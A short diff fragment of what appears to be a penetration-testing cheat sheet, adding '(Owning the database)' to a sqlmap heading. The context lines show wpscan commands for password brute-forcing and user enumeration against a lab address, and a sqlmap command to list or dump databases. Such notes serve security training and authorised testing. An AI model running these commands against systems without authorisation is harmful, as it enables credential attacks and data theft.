@@ -52,7 +52,7 @@ wpscan -u james -P /password.txt — url http://172.16.0.27:8080/CEH/
 wpscan --url https://example/ --enumerate u (To enumerate the user)
 
 
-SQLMAP:-
+SQLMAP:- (Owning the database)
 
 1) sqlmap -u "url?id=1" --dbs or --dump
 
